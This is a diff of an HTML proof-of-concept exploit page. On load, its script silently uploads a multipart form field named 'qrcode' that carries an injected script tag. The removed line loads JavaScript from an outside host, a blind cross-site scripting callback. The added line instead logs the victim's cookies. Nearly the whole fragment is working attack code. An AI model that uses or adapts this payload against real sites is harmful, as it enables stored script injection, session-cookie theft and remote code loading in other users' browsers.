@@ -6,14 +6,14 @@
     <script>
         window.onload = function() {
             var xhr = new XMLHttpRequest();
-            var boundary = "-----------------------------110423259726704186431623284180";
+            var boundary = "---------------------------110423259726704186431623284180";
 
             // Constructing the payload with the desired script injection
             var body = boundary + "\r\n" + 
                 "Content-Disposition: form-data; name=\"qrcode\"; filename=\"qrcode.txt\"\r\n" + 
                 "Content-Type: text/plain\r\n" + 
                 "\r\n" + 
-                "</script><script src=\"https://js.rip/bt7jtmfeop\"></script>\r\n" + 
+                "</script><script>console.log(document.cookie)</script>\r\n" + 
                 boundary + "--\r\n";
 
             var uint8Array = new Uint8Array(body.length);
